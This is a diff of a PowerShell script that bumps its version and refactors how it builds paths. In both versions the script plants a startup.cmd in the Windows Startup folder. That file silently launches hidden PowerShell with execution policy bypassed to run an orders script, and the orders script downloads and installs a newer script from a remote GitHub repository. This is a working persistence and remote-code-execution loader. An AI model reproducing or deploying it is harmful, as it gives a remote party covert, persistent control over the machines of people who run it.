@@ -1,4 +1,4 @@
-[string]$Version = 16
+[string]$Version = 17
 Write-Host "process script starting: $Pid"
 
 ### Test ###
@@ -19,16 +19,14 @@ Get-Process -Name "*PowerShell*" | ForEach-Object {
 }
 
 ### Create starup.cmd ###
-[string]$path = $env:APPDATA
-[string]$StartupCmdPath = "$path"+"\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"
+[string]$StartupCmdPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\startup.cmd"
 
 if(test-path($StartupCmdPath)){
     Remove-Item -Path $StartupCmdPath
 }
 New-Item -ItemType File -Path $StartupCmdPath -Force
 
-$path = $env:APPDATA #override
-$OrderPath = "$path"+"\Test\$Version\orders.ps1"
+$OrderPath = "$env:APPDATA\Test\$Version\orders.ps1"
 
 $StartupCode = 'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -NoLogo -WindowStyle Hidden -file "'+"$OrderPath"+'"' #invisible
 #'START /min C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -executionpolicy bypass -file "'+"$OrderPath"+'"' #visible
@@ -43,8 +41,7 @@ $OrderCode = '
 	#while(!$update){
         $remote_script = $null
 		$remote_script = Invoke-WebRequest -URI "https://raw.githubusercontent.com/k4d4m/obey/master/script.ps1" | Select -expand Content
-		$remote_version = ($remote_script -split '+'''\n'''+')[0]
-		$remote_version = $remote_version.substring(19)
+		$remote_version = (($remote_script -split '+'''\n'''+')[0]).substring(19)
 		$Version = '+"$Version"+'
 		Write-Host "current version = $Version"
 		if($Version -ne  $remote_version){
@@ -57,9 +54,7 @@ $OrderCode = '
 		}
 	#}
 	if($update){
-		$path = $env:APPDATA
-		$FolderName = "\Test\$remote_version\"
-		$ScriptPath = "$path"+"$FolderName"+"script.ps1"
+		$ScriptPath = "$env:APPDATA\Test\$remote_version\script.ps1"
 		if(test-path($ScriptPath)){
 			Remove-Item -path $ScriptPath
 		}
